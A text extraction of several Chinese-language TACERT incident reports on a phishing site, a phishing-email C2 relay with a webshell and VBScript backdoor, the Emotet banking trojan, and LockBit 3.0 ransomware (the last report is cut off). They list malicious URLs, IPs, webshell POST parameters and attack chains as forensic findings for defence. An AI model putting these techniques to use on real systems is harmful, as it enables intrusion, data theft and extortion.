        "content": "個案分析- 釣魚網站(Phishing)分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2012/8  1 Taiwan Academic Network Computer emergency Response Team(TACERT) 前言 釣魚網頁利用偽造的頁面,讓使用者相信它是合法的網頁,進而輸入個人資料,騙取個 資。釣魚網頁風行已久,由於多數人習慣用眼睛辨認頁面,並不會二次確認頁面網址是 否正確,導致這種簡單的攻擊手法歷久不衰。 此次事件的釣魚網頁如圖一,其整體配色以及設計與圖二合法的官網是一致的,如果沒 有仔細觀察其網址,使用者很難察覺圖一頁面是假的。 圖一 釣魚網頁  2 Taiwan Academic Network Computer emergency Response Team(TACERT) 圖二 真正的官網 事件說明 釣魚網頁主機為C大學的職員工作機,以下是使用者提供的主機資訊: – 位於C 大學 – IP:140.xxx.121.130 – Windows XP – 普通文書機 – 沒有安裝網頁伺服器 – 有安裝防毒NOD32 – 有開啟遠端登入 該主機僅是一般使用者的文書機,預設不提供網頁服務,不過其網路狀態確實開啟了80 port,使用該埠號的程式為 Apache.exe,乍看與真正的網頁伺服器apache無異,如圖 三。登錄檔上關於Apache的部份Publisher為空白,如圖四。進入主機上的Apache.exe (位於C:\\apache\\)所在資料夾,裡面有一些異常的檔案,分別用瀏覽器和文字編輯器  3 Taiwan Academic Network Computer emergency Response Team(TACERT) 打開之後如圖四,從上面的文字可以看得出來,是控制Apache和 MySql的GUI。 圖三 140.xxx.121.130 網路狀態 圖四 主機上Apache 沒有Publisher 圖四 左140.xxx.121.130 放置Apache.exe 的資料夾內容;右上 controlpanel 直接點擊的 內容;右下 controlpanel 用筆記本打開的內容 沒有Publisher 路徑C:\\apache\\apache.exe  4 Taiwan Academic Network Computer emergency Response Team(TACERT) 初步判斷,這是一個無須安裝直接點擊就可以使用的",
        "Page_Num": "1,2,3,4,5"
    },
    "577": {
        "File_Name": "個案分析-釣魚網站(phishing).pdf",
        "content": "Apache伺服器,其controlpanel中 Setup 項目下的 Install Apache as Service 選項,可以把Apache註冊到登錄檔裡面, 使其開機自動執行。由於使用者對自己主機上面的Apache完全沒有印象,加上該主機開 啟了遠端桌面,使用簡單帳號密碼,C槽有apache.rar,故推測駭客可能是由遠端桌面 登入之後,下載apache.rar,手動解壓縮進行Apache安裝,設置釣魚網頁相關設定。 結論 弱密碼一直是資訊安全上面很大的弱點,無論硬體設備以及技術如何進步,人為的密碼 設定礙於記憶不便,一直都有強度不夠的問題,本次例子即為一例。建議登入主機的密 碼一定要高強度,一旦使用弱密碼被猜測出來,等同於整台主機使用者交到駭客手上。 ",
        "Page_Num": "5"
    },
    "578": {
        "File_Name": "個案分析-釣魚郵件之中繼站Botnet行為分析報告_10906.pdf",
        "content": "釣魚郵件之中繼站 Botnet 行為分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2020 年06 月 (閱讀本報告前請先閱讀TACERT 2020 年4 月個案「釣魚郵件之中繼站攻擊事 件分析報告」)  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、 事件簡介 1. 在2020/03 TACERT 接獲外部情資通知某學校IP:140.X.X.22(簡稱22 主機)所 屬設備淪為釣魚信件之中繼站。 2. 駭客大量散播含有可轉址至22 主機網址的釣魚信件。當受害者點選惡意網址 後,22 主機會回傳惡意的VB Script 給受害者的主機。受害者主機會執行VB Script 腳本、建立Password.txt 、檢測是否存在特定的防毒軟體、回傳主機軟 硬體資訊與執行中的程式內容等。 3. 為了解22 主機作為中繼站(C2 Server)與Botmaster、Bot 之間的網路行為,對 該主機所側錄的封包進行深度分析。 二、事件檢測 1. 首先,從22 主機的網站日誌發現有三個IP(IP:61.X.159.176、51.X.163.54 與 140.X.X.97)頻繁連線22 主機,其中IP: 51.X.163.54 為來自國外比利時的IP。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 2. 在檢測22 主機時發現在C:\\winodws\\Temp\\3 內有許多資料夾,每個資料夾內 都有VB Script 檔案。 3 資料夾如同有各種VB 腳本的工具包,其中有許多資料夾僅有winapp.vbs 與ewinapp.vbs 兩檔案,而各資料夾內所存放的檔案內容如下表所示。 資料夾檔案內容 資料夾名稱 winapp.vbs 與 ewinapp.vbs vceamember、secriskman、sec_issue、sal2020、proreport、 projects_briefing_pwd、projects_briefing_mac、profitloss、 profdist、profc",
        "Page_Num": "1,2,3"
    },
    "579": {
        "File_Name": "個案分析-釣魚郵件之中繼站Botnet行為分析報告_10906.pdf",
        "content": "n、personal_request、pdevplan、okex_rep、 newproject、neoguide、mysal、jst_termsheet、jpsec、 it_integrators、interview、fsecure、far、devguideline、 devguide_sbi、candidate_jobs_pwd、candidate_jobs_mac、 bonusm、blocklancer_info、bguidecn、1salary2020、1riskcheck、 1risk2020、1profit、1newpolicy、1JpSalary2020、1devguide、 1covid csapp.vbs 與 ecsapp.vbs rreview  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 資料夾檔案內容 資料夾名稱 ehelp.vbs 與 help.vbs riskass、profits_feb、job_feb、InvLoi_Mar、interview_feb、 bonus_feb winapp.vbs、m.doc 與ewinapp.vbs personal_request_cn winapp.vbs、 m.doc、n.doc 與 ewinapp.vbs fidelity_job 3. 從所側錄的封包發現,當受害者主機執行POST /edit 連線時,所傳送給中繼 站(22 主機)的參數,與C:\\Windows\\Temp\\3 內winapp.vbs 與ewinapp.vbs 有關, 兩檔案內容開啟後為亂碼。 以IP:104.X.28.34 對22 主機請求POST /edit 連線為例(如下圖),該IP 傳送 「s=0a8mieF&o=ts&p=cfg.ini%7CLOG%5Cblocklog.dat%7Csec_issue%5Cewi napp.vbs%7Csec_issue%5Cwinapp.vbs」等參數內容,從內容中可看到cfg.ini、 LOG\\blocklog.dat、sec_issue\\ewinapp.vbs 與sec_issue\\winapp.vbs 等檔案名稱。 4. 當IP:104.X.28.34 執行POST /edit 時傳送參數「S=0a8mieF&o=hash&p=」,",
        "Page_Num": "3,4"
    },
    "580": {
        "File_Name": "個案分析-釣魚郵件之中繼站Botnet行為分析報告_10906.pdf",
        "content": "則 中繼站回應C:\\Windows\\Temp\\3 內所有檔案列表與各檔案的HASH 值。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 5. 當IP:51.X.163.54 執行POST /edit 時傳送「S=0a8mieF&o=ls&p=fidelity_job」, 則中繼站回應C:\\Windows\\Temp\\3\\fidelity_job 內所有檔案列表、檔案大小與 當下檔案最後修改時間。由此IP:51.X.163.54 會執行Post 傳送參數、查看3 資料夾內資料的行為,推測該IP 疑似為駭客來源IP 。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 6. 在2020/03/25 14:22~2020/03/26 11:12 封包側錄期間共有441 個IP 產生3,515 次連到22 主機的8080port 連線,而22 主機的網址別名共有19 個。其中有 五個網址有頻繁連線現象,分別為: up.digxxxxxx.com (301 次連線)、 name.ownxxxxx.me (217 次連線)、upload.gdrxxxx.best (173 次連線)、 docs.gdrxxxxxxxx.top (163 次連線)、client.cloxxxxx.space (96 次連線)。 7. 從封包發現有15 個國外IP 曾經執行過 VB Script 腳本,使用8 種不同網址 別名連到22 主機,其中有3 個IP 執行多次,包含比利時IP:51.X.163.54。推 測比利時IP 執行VB Script 的行為可能是在測試VB Script 的執行狀況。由這 些IP 的網路行為可得知,這些IP 在執行VB Script 後將會回傳主機資訊與運 行中的程序資訊給給22 主機(在TACERT 2020 年4 月個案檢測提到),並且 這些IP 在Botnet 中可能扮演Bot 的角色。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 8. 觀察比利時IP",
        "Page_Num": "4,5,6,7"
    },
    "581": {
        "File_Name": "個案分析-釣魚郵件之中繼站Botnet行為分析報告_10906.pdf",
        "content": ":51.X.163.54 的連線行為,發現它會透過Post 傳送參數,並且 查看bckip.dat、fidelity_job\\winapp.vbs、res\\log.dat...等檔案,也用Post 上傳 bckurl.dat、fidelity_job\\ewinapp.vbs、fidelity_job\\winapp.vbs ...等檔案。從 fidelity_job\\winapp.vbs 內容發現為前述22 主機傳送給受害者主機的VB 原始 碼,而且此種類型的檔案在C:\\Windows\\3\\各資料夾內很多。由比利時IP 的 連線行為推測比利時IP 可能為駭客來源IP。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 9. 由封包分析比利時IP:51.X.163.54 的連線行為,發現該IP 在2020/3/25 14:51 ~2020/03/26 9:16 期間共對22 主機連線311 次。此段時間共連線4 個22 主機 的網址別名,共執行242 次Put 與37 次Get 動作。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 10. 在2020/03/25 17:44~2020/03/26 2:55 期間,比利時IP:51.X.163.54 一直對22 主機(網址:up.digXXXXXX.com)進行下列網路行為共有161 次。由比利時IP 對22 主機所傳送參數內容可以推測出該IP 在Botnet 中擔任Botmaster 的角 色。 (1)比利時IP:51.X.163.54 一直列出res 資料夾內容,來查看是否有最新的 log.dat 檔。若有,則取得log.dat 檔。 (2)比利時IP 會取得bckip.dat、上傳bckip.dat 與bckurl.dat。 (3)比利時IP 會取得res 資料夾內bas 檔、某些資料夾VBS 腳本檔與上傳這些  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team VBS 腳本檔來進行腳本更新",
        "Page_Num": "7,8,9,10"
    },
    "582": {
        "File_Name": "個案分析-釣魚郵件之中繼站Botnet行為分析報告_10906.pdf",
        "content": "。 (4)比利時IP 在最後取得log.dat 後即刪除一直監視的res 資料夾,隨後又將 log.dat 上傳至res 資料夾。它也取得bckurl.dat、cfg.ini 與LOG/blocklog.dat 等檔案。 11. 比利時IP:51.X.163.54 會透過Post 傳送list 指令,請22 主機回傳res 資料夾 的資料內容。下圖為22 主機回傳受害者IP:185.X.221.96 的紀錄.bas 檔與 log.dat 檔的連線行為。  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 12. 從所側錄的封包發現有兩個美國IP:104.X.28.74 與104.X.28.34 曾經請求22 主機回傳res.zip 檔,由封包可以看到該res.zip 內有bas 檔與log.dat。res.zip 存有受害主機回傳的資訊bas 檔,而兩個美國IP 想取得此檔案之行為疑似為 駭客行為。 下圖封包內容中所出現「res\\196.X.203.36」為前面所述曾經執行過VB Script 的15 個國外IP 之一,因此可以推斷res.zip 內含有受害主機的資訊。  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 三、網路連線行為示意圖 在網路連線行為示意圖中,可以清楚地看到三種Botnet 角色。 1. Botmaster 比利時IP:51.X.163.54 主機在本次事件中疑似扮演Botmaster 角色,由封包可 得知該主機持續不斷對中繼站(22 主機)傳送參數來執行一些指令,例如:更新  12 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 資料夾內的VB Script、查詢res\\log.dat、取得res 資料夾內容...等等。另外, 美國IP:104.X.28.34 與IP:104.X.28.74 取得res.zip 之網路行為疑似為駭客行 為。 2. C&C Server 22 主機為本次",
        "Page_Num": "10,11,12,13"
    },
    "583": {
        "File_Name": "個案分析-釣魚郵件之中繼站Botnet行為分析報告_10906.pdf",
        "content": "事件中擔任中繼站的角色,負責收集受害主機群回傳的主機資 訊與提供VB Script 給受害主機去執行。 3. Bot 受害主機群,在封包側錄期間發現有多個國內外IP 執行過VB Script,表示 這些主機將會回傳主機資訊與執行中的程序資訊給中繼站。 四、總結與建議 1. 本事件的22 主機是一台釣魚郵件的中繼站,當受害主機一經點選惡意網 址後會連至22 主機讀取edit.php,而22 主機會回傳惡意的VB Script 給受 害主機。之後受害主機會執行VB Script 腳本、回傳主機軟硬體資訊與執 行中的程式內容等,詳細檢測資訊請參考TACERT 2020 年4 月個案「釣 魚郵件之中繼站攻擊事件分析報告」。 2. 檢視本事件所用的VB Script 腳本發現為2019 年年底特定APT 組織用來 攻擊加密貨幣交易所的惡意程式。 3. 從網路封包分析,發現疑似駭客IP 的比利時IP:51.X.163.54 會透過edit.php (Webshell 檔案)下達指令,來存取22 主機內Temp\\3 資料夾內檔案。 4. 比利時IP:51.X.163.54 在封包側錄期間曾經多次存取VB Script 並且更新 它,也一直列出res 資料夾內容,來查看是否有最新的log.dat 檔。若有, 則取得log.dat 檔。此存取res 資料夾的動作主要在取得受害主機的資訊。 ",
        "Page_Num": "13"
    },
    "584": {
        "File_Name": "個案分析-釣魚郵件之中繼站攻擊事件分析報告_10904.pdf",
        "content": "釣魚郵件之中繼站 攻擊事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2020 年04 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、 事件簡介 1. 2020/03 TACERT 接獲外部情資通知某學校IP:140.X.X.22(簡稱22 主機)所屬 設備為一台釣魚信件之中繼站。 2. 駭客大量寄出釣魚信件,而信件內容中含一網址,當受害者點選該網址,即 會連線至IP:140.X.X.22 主機。 3. 22 主機的作業系統為64 位元的Windows 10,其用途為存放實驗室研究資料 用。該主機有提供實驗室成員遠端存取資料與運算資料的服務,為一台長期 不關機的主機。 4. 22 主機曾因活動需求架設網站,該網站功能在2020/2 再次被啟用。 5. 為了解該主機作為中繼站被駭客利用之情形,對該主機進行實機鑑識作業。 二、事件檢測 1. 首先,檢視22 主機的Port 開啟狀況發現開啟許多Port,包含駭客常易攻擊的 3389port、網頁服務的8443port(https)與8080port(http)。 2. 該主機會定期執行Windows Update,但主機沒有啟用防毒軟體。 3. 檢視主機對外連線狀況,發現有大量IP 連線至22 主機的3389port,疑似暴 力攻擊。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 4. 檢視主機的帳戶,發現帳戶Lab-5xx9 自2019/2/19 下午03:02:57 開始從未修 改密碼,而且該帳戶具有管理者權限。 5. 由主機的系統日誌發現安全性紀錄在2020/03/23 22:57 以前的紀錄皆已被刪 除,無法追蹤RDP 連線登入主機的紀錄。 6. 因帳戶Lab-5xx9 的密碼為帳戶上四位數字5xx9(弱密碼),推測該主機被駭客 從遠端連線登入的機率很高。 7. 在C:\\xampp\\htdocs 發現edit.php(最後修改時間:2020/03/16 20:55),",
        "Page_Num": "1,2,3"
    },
    "585": {
        "File_Name": "個案分析-釣魚郵件之中繼站攻擊事件分析報告_10904.pdf",
        "content": "其中內有 Sg_load 為一大段亂碼,它是使用sourceguardian 加密的程式碼。經測試發現 Sg_load 的內容若沒有專門的解碼工具是無法看到程式原始碼。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 8. 從封包分析發現當受害者的主機讀取edit.php 後,該PHP 檔會從22 主機傳送 VB Script 程式碼給連線的主機去執行,而所傳送的VB Script 內容分段敘述 如下。 8.1 從第一段的Script 內容發現,該VBScript 執行後會在受害主機的TEMP 資料夾內產生Password.txt 文字檔。 8.2 下圖為Script 第二段內容,在內容中有網址https://bit.ly/2xxxxxc 與ln 的 一段亂碼。網址點選後會跳轉另一個網址 http://name.owxxxxil.me:8080/edit?id=M/az7Z7yGk44SLFGIMDGXguYpOwlha  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 0TobOzP1U7vB8dO40L6mwgtDNF2UxkIyaH1NECBMa88a9cSjcRrb%2Bm3Q %3D%3D,從封包內容發現有外來IP 執行「Get name.owxxxxil.me:8080/edit? id=....」時會連線到22 主機,推測該網址會對應到22 主機的IP。 8.3 ln 亂碼內容做Base 64 解碼後結果如下圖,透過lnk 文件可以將這個亂 碼做base64 解碼後執行payload。這是一個後門類的VB Script,該腳本持續 向http://140.X.X.22:8080/edit?topic=s[random number(隨機數)]發送POST 請 求。如目標返回的數據大於等於10 字節則結束POST 請求,然後執行返回 的數據。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response",
        "Page_Num": "3,4,5,6"
    },
    "586": {
        "File_Name": "個案分析-釣魚郵件之中繼站攻擊事件分析報告_10904.pdf",
        "content": "Team 8.4 Script 第三段內容會透過mshta 呼叫lnk 檔來執行VB Script 腳本 sqfrmwmq.vbs。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 8.5 由Script 第四段內容(如下圖)得知,該Script 有偵測是否存在某些防毒軟 體的程序與對應的作法,而IP:140.X.X.22:8080/edit 被寫入程式碼中。 9. 檢視來自受害者主機的封包,發現受害者主機回傳自己主機的資訊給中繼站 (22 主機)並告訴中繼站有哪些執行中的程序。所傳送的主機資訊包含使用者 帳戶名稱、主機名稱、主機作業系統名稱與版本、作業系統安裝日期、主機 開機時間、CPU 規格、VB Script 腳本存放路徑與網路卡資訊等。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 10. 從受害者主機的封包內容得知,cmd.exe 正在受害者主機的TEMP 內產生 Password.txt,也得知正在用wscript 於受害者主機上執行腳本sqfrmwmq.vbs。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 11. 由前述Script 程式碼與受害者封包分析,得知受害者主機在收到中繼站(22 主 機)的VB Script 後會執行下圖的程序。 12. 從22 主機的網站日誌發現有三個IP(IP:61.X.159.176、51.X.163.54 與 140.X.X.97)頻繁連線22 主機,其中IP: 51.X.163.54 為來自國外比利時的IP。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 13. 由22 主機的網站日誌發現,學網某校IP:140.X.X.97 從2020/02/23 23:55:49 開始POST /edit,至2020/03/04 15:44:42 最後一次POST /edit,推測該IP 所 屬設備為受害者主機。  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergen",
        "Page_Num": "6,7,8,9,10,11"
    },
    "587": {
        "File_Name": "個案分析-釣魚郵件之中繼站攻擊事件分析報告_10904.pdf",
        "content": "cy Response Team 查詢該IP 資安通報單的紀錄發現在2020/02/10、2020/02/27 與2020/03/04 該 主機曾感染挖礦程式,而且前述VB Script 在2019 年年底曾被特定APT 組織 用來專門攻擊處理挖礦交易的加密貨幣公司。 三、事件攻擊行為示意圖 1. 駭客以暴力破解與RDP 方式駭入22 主機。 2. 駭客將edit.php 置入在22 主機的C:\\xampp\\htdocs 資料夾內。  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. 駭客置入惡意VB script 與惡意檔案於C:\\Windows\\Temp\\3 資料夾內。 4. 駭客會不定時存取Temp\\3 資料夾內檔案。 5. 駭客散播含有22 主機IP 網址的釣魚信件。 6. 受害者收到釣魚信件後,點選信件內會轉址到22 主機的IP 網址來進行 惡意連線。 7. 中繼站(22 主機)收到受害者主機的連線請求後,會回傳VB Script 給受害 者主機。 8. 受害者主機執行從中繼站收到的VB Script 腳本。 9. VB Script 腳本執行時會在受害者主機上產生Password.txt 與Xbox.lnk 兩 個檔案。 10. VB Script 腳本執行時會偵測是否存在兩個特定的防毒軟體。 若存在,則執行cscript.exe {RANDSTR}.vbs。 反之,則執行wscript.exe {RANDSTR}.vbs。 11. 連線http://140.X.X.22/edit?topic=sxxxx。 12. 執行{RANDSTR}.vbs 傳送受害者主機資訊與執行中的程序資訊給22 主 機。 13. VB Script 腳本執行時會偵測有無特定防毒軟體的程序運行中。 若無特定防毒軟體程序,則在啟動資料夾內建立Xbox.lnk。 若存在特定防毒軟體程序,則刪除Xbox.lnk。 四、總結與建議 1. 本事件為校園主機淪為釣魚郵",
        "Page_Num": "11,12"
    },
    "588": {
        "File_Name": "個案分析-釣魚郵件之中繼站攻擊事件分析報告_10904.pdf",
        "content": "件之中繼站。在主機的帳戶密碼為弱密碼且 防毒軟體關閉的狀況下,該主機又開啟RDP 遠端連線的服務,提高駭客 駭入主機的機會。 2. 駭客大量散播含有可轉址至22 主機網址的釣魚信件。當受害者點選惡意  12 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 網址後,22 主機會回傳惡意的VB Script 給受害者的主機。 3. 受害者主機會執行VB Script 腳本、建立Password.txt 、檢測是否存在特 定的防毒軟體、回傳主機軟硬體資訊與執行中的程式內容等。 4. 本事件所用的VB Script 腳本為2019 年年底特定APT 組織用來攻擊加密 貨幣交易所的惡意程式。 5. 關於本事件的預防措施,有幾點建議如下: (1) 加強帳戶的密碼強度。 (2) 安裝防毒軟體、定期更新病毒碼與進行掃毒作業。 (3) 限制遠端連線主機的來源IP。 (4) 關閉主機內非必要開啟的port。 (5) 定時備份主機資料,並且分散主機內研究資料的存放地方,以降低感 染勒索病毒的風險。 (6) 定期進行主機內軟體更新與修補漏洞。 ",
        "Page_Num": "12,13"
    },
    "589": {
        "File_Name": "個案分析-銀行木馬emotet攻擊事件分析報告_10801.pdf",
        "content": "銀行木馬emotet 攻擊事件 分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2019 年1 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、 事件簡介 1. 2014 年安全研究人員首次發現了銀行特洛伊木馬Emotet,它最初被設計為一 種銀行惡意軟體,試圖潛入使用者的電腦來竊取敏感和私密信息。 2. 2018 年後續版本的Emotet 包括向受感染主機安裝其他惡意軟體的能力,此 惡意軟體可能包括其他銀行特洛伊木馬或垃圾郵件(malspam)傳遞服務。 3. 趨勢科技在2018 年11 月公布知名銀行木馬Emotet 的蹤跡,發現它在2018 年6 月1 日到11 月15 日期間於全球建立721 個C&C 伺服器,採用8,528 個 獨立的URL,使用5,849 個文件Dropper 以及571 個執行檔案。 4. 為了解現行的銀行木馬Emotet 之惡意行為,本中心取得樣本進行檢測。 二、 事件檢測 1. 首先,在Windows 7 作業系統上,開啟樣本Final notice.doc。打開後,出現 該文件是由早期office 版本所產生的說明文字,並告知要如何才能看到文檔 內容。當該Word 檔開啟後,若沒有使用檢測工具,一般使用者不會感覺到 主機有異常現象。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 2. 檢視主機背景程式運作情形,發現在Final notice.doc 開啟後,會直接呼叫 cmd.exe 2 次,之後再陸續執行powershell.exe、462.exe 與symbolmsra.exe。 從Powershell 的命令列可以看到有一些網址的資訊與DownloadFile 用字,推 測該指令可能連線至這些網址下載東西到受測主機內。 從命令列中也可以得知在temp 資料夾中會產生一個462.exe 執行檔。 3. 檢視主機對外連線狀態,發現執行powershell.exe 時會對外連線3 個固定的目 的IP,分別為芬蘭IP:95.",
        "Page_Num": "1,2,3"
    },
    "590": {
        "File_Name": "個案分析-銀行木馬emotet攻擊事件分析報告_10801.pdf",
        "content": "216.44.18、美國IP:108.174.147.74 與英國 IP:37.247.116.235,而執行symblomsra.exe 時會對外連線數個目的IP,其中英 國IP:95.141.175.240 為常連線的目的IP。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 4. 查看所側錄的主機對外連線封包,發現到下列資訊。 (1) 當執行powershell.exe 而連線芬蘭IP:95.216.44.18 時,對方主機回覆 http://www.khutt.org/0lz8WgN 的內容已被移至/cgi-sys/suspendedpage.cgi。 當瀏覽http://www.khutt.org/cgi-sys/suspendedpage.cgi 網頁時,則被告知該 帳號為可疑帳號,請盡速聯絡支援部門。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (2) 當執行powershell.exe 而連線美國IP:108.174.147.74 時,主機回覆伺服器 無法驗證使用者是否有連線存取文件的權限,需有授權才可以存取。 (3) 當powershell.exe 執行而連線英國IP:37.247.116.235 時,會下載檔案 91.exe。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (4) 當執行symblomsra.exe 而連線英國IP:95.141.175.240 時,對方主機回覆經 加密過的亂碼。該連線行為每隔一段時間便重啟連線,推測為受測主機對 遠端主機進行報到動作,告訴遠端主機該主機仍然存活著。 5. 查看462.exe 與symbolmsra.exe 兩程式所在的資料夾,發現462.exe 在它執行 後便自我刪除,而symbolmsra.exe 仍然在該資料夾內。 6. Final notice.doc 與symbolmsra.exe 經Virustotal 檢測,其結果如下:  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (1) Final notice.doc:惡意比例為42/59",
        "Page_Num": "3,4,5,6,7"
    },
    "591": {
        "File_Name": "個案分析-銀行木馬emotet攻擊事件分析報告_10801.pdf",
        "content": ",而且有多家防毒軟體公司將它視為 Downloader 下載器。 (2) symbolmsra.exe:惡意比例為55/70,有多家防毒軟體公司用Emotet 命名它。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 7. 檢視主機登錄檔紀錄,發現symbolmsra.exe 會在主機重新開機後自動啟動。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 8. 查看Final notice.doc 的內容,發現內藏巨集,而且透過該巨集會呼叫cmd.exe 與Powershell.exe 來執行惡意程式下載行為。從巨集的程式碼內容得知, Function Ahjos 會在Word 檔被打開時自動執行。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 三、 事件攻擊行為示意圖 1.駭客散播有惡意附件或惡意連結的垃圾郵件。 2.使用者開啟含有惡意巨集的附件文檔。 3.惡意巨集呼叫cmd.exe 與powershell.exe 來下載Emotet 惡意程式(ex. 462.exe)。 4.執行Emotet 程式來複製程式副本至主機內,因而產生symbolmsra.exe。 5.刪除最初下載的Emotet 程式 (ex.462.exe)。 6.執行symbolmsra.exe 建立註冊表自動啟動key,並且注入本身於運作程序 中。 7.報告所收集的主機資訊給C2 伺服器,並且接收指令。  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 8.執行來自C2 伺服器的模組程式(ex.91.exe)。( a.更新Emotet 程式副本 b. 垃圾郵件 c.竊取憑證 d.網路散播) 四、 建議與總結 1. Emotet 通常透過垃圾郵件(malspam)來進行散播。早期版本使用惡意 JavaScript 文件來感染主機,後來的版本演變為它可通過惡意腳本、啟用 macro 的文檔或惡意連結來感染受害主機。 2. 當使用者開啟或下載含有Emotet 的惡意PDF",
        "Page_Num": "7,8,9,10,11"
    },
    "592": {
        "File_Name": "個案分析-銀行木馬emotet攻擊事件分析報告_10801.pdf",
        "content": "或Word 檔案,Emotet 就能 常駐於受害者的電腦上,進而下載其它的惡意模組,或是伺機感染網路上 的其它裝置。 3. Emotet 可使用C&C 伺服器來接收更新,這允許攻擊者安裝軟體的更新版 本、安裝其他惡意軟體(如其他銀行特洛伊木馬),或作為財務憑證,用 戶名和密碼以及電子郵件地址等被盜信息的傾倒場。 4. Emotet 也可使用「Eternal Blue」 SMB 漏洞來直接感染未修補的Windows 系統 ,而且都不需要任何使用者點擊或登錄。 5. 針對Emotet 的資安防護與處理作業,提供幾點建議如下。 (1) 定期更新作業系統的修補程序與更新病毒碼,使主機保持最新狀態。 (2) 因Emotet 可利用Windows Eternal Blue 漏洞來執行其工作,建議關閉 與此漏洞有關的445 port。 (3) 請勿下載與開啟可疑附件或點擊可疑的連結。 (4) 加強使用者帳戶的密碼強度。 ",
        "Page_Num": "11"
    },
    "593": {
        "File_Name": "個案分析-雙重勒索軟體LockBit 3.0分析報告.pdf",
        "content": "0 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team TLP:WHITE 雙重勒索軟體LockBit 3.0 分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2022 年07 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、事件簡介 1. 2019/9 LockBit 首次出現,至2021/6 出現升級版LockBit 2.0 (勒索軟體即服務 (RaaS))。到2022/6 新版LockBit 3.0(又名LockBit Black)產生,而LockBit 3.0 的新變種採用了新的勒索軟體策略,並首次推出了勒索軟體漏洞賞金計 劃。 2. 由下圖發現在Conti 攻擊下降的情況下,LockBit 的攻擊在2021/7 開始出現逐 漸上升的大量攻擊趨勢,至2022/3 達到高峰。 上圖為2020 年8 月至2022 年3 月期間受LockBit(綠色直條)攻擊之每月受害組織的 統計和累計數量(資料來源:趨勢科技 Conti vs. LockBit: A Comparative Analysis of Ransomware Groups (June 27, 2022 發佈)) 3. 為了解Lockbit 3.0 的攻擊行為,故對其樣本進行檢測作業。 二、 事件檢測 1. 在32 位元的Windows 7 作業系統上執行LockBit 3.0 樣本d61af.exe (MD5:628e4a77536859ffc2853005924db2ef)後,馬上出現勒索通知信 HLJkNskOq.README.txt。在執行加密完成後,d61af.exe 在原資料夾內消失。 執行前 執行後  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 2. 該樣本d61af.exe 執行後,不會加密圖檔,只會將主機內一些資料類型的檔案 加密,並將檔名改為「亂碼.HLJkNskOq 」。 加密前 加密後 3. 接著桌面會出現標題為LockBit Black 的桌布與HLJkNskOq.README.txt 的 勒索通知信。 4. d",
        "Page_Num": "1,2,3"
    },
    "594": {
        "File_Name": "個案分析-雙重勒索軟體LockBit 3.0分析報告.pdf",
        "content": "61af.exe (PID:2420)執行後,會加密資料類型的檔案、變更檔名、產生勒索 通知信,並且竊取這些加密資料。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 5. d61af.exe (PID:2420)執行後,會啟動服務執行另一個程序 d61af.exe(PID:3148)。該程序會在C:\\ProgramData 產生1376.tmp 此暫存檔, 最後會執行cmd.exe 刪除1376.tmp。 6. 在C:\\ProgramData 內發現d61af.exe 加密檔案後做為桌布之圖檔 HLJkNskOq.bmp 與做為被加密檔案之圖示的HLJkNskOq.ico 。 7. 勒索通知信HLJkNskOq.README.txt 內容攏長,一開始告訴受害者你的資料 被竊取與被加密,若不給付贖金會將資料公布於TOR 暗網上,而且可能瞬間 被您的競爭者買走資料。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 8. 它提供多個LockBit BLOG 連結,連結開啟可以看到許多個即將贖金到期的 受害組織名稱與其資料。 9. 瀏覽某受害組織被公告的內容,發現網頁上會有檔案預計被發佈的剩餘時 間、組織名稱、被竊資料檔案的大小、給付贖金的最後期限時間、付贖金的 方式與被竊取資料的樣本等資訊。此種建置受害組織公告網站的方式與以往 勒索軟體的攻擊策略不同,它告知受害者若不付贖金的後果將會很大,加強 受害者的壓力。  5 臺灣學術網路危機處理中心(TACERT) 